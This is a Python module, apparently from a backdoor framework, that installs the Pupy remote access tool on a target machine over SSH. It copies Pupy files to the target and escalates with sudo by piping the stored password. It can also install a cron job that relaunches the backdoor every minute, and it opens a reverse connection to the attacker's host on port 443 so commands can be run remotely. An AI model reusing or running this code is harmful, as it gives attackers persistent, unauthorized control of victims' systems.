from backdoor import *

class Pupy(Backdoor):
    prompt = Fore.RED + "(pupy) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Pupy module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None

        
    def do_exploit(self, args):
        port = self.get_value("port")

	print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        

	cron = (raw_input(" + Press y to start backdoor as a cronjob: ") == 'y')


        self.target.ssh.exec_command('rm -r pupy')
        self.target.scpFiles(self, 'pupy/pupy', True)
        self.target.scpFiles(self, 'rpyc', True)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
        raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
         
	if(cron):
            self.target.ssh.exec_command("crontab -l > mycron")
            str = ("* * * * * echo \\\""+ self.target.pword + "\\\" | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443" )
            #print ("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
            self.target.ssh.exec_command("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
        #do it in either case to start the backdoor.


	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S python pupy/pp.py simple --host " + self.core.localIP + ":443")
        
	raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")


